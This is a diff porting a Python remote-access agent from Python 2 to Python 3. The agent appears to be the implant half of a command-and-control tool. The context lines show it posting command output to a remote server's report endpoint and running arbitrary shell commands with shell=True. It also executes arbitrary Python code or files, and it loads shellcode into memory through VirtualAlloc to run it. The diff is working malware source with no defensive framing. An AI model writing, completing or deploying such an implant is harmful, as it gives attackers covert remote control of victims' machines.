@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 # coding: utf-8
 
 import requests
@@ -11,7 +11,7 @@ import sys
 import traceback
 import threading
 import uuid
-import StringIO
+import io
 import zipfile
 import tempfile
 import socket
@@ -103,7 +103,7 @@ class Agent(object):
         if not output:
             return
         if newlines:
-            output += "\n\n"
+            output += str("\n\n")
         req = requests.post(config.SERVER + '/api/' + self.uid + '/report',
                 verify=config.TLS_VERIFY,
                 data={'output': output})
@@ -119,6 +119,8 @@ class Agent(object):
             proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             out, err = proc.communicate()
             output = (out + err)
+            if os.name == "nt":
+                output = output.decode('cp850')
             self.send_output(output)
         except Exception as exc:
             self.send_output(traceback.format_exc())
@@ -126,10 +128,10 @@ class Agent(object):
     @threaded
     def python(self, command_or_file):
         """ Runs a python command or a python file and returns the output """
-        new_stdout = StringIO.StringIO()
+        new_stdout = io.StringIO()
         old_stdout = sys.stdout
         sys.stdout = new_stdout
-        new_stderr = StringIO.StringIO()
+        new_stderr = io.StringIO()
         old_stderr = sys.stderr
         sys.stderr = new_stderr
         if os.path.exists(command_or_file):
@@ -278,7 +280,7 @@ class Agent(object):
     def execshellcode(self, shellcode_str):
         """ Executes given shellcode string in memory """
         shellcode = shellcode_str.replace('\\x', '')
-        shellcode = shellcode.decode("hex")
+        shellcode = bytes.fromhex(shellcode)
         shellcode = bytearray(shellcode)
         ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                                   ctypes.c_int(len(shellcode)),
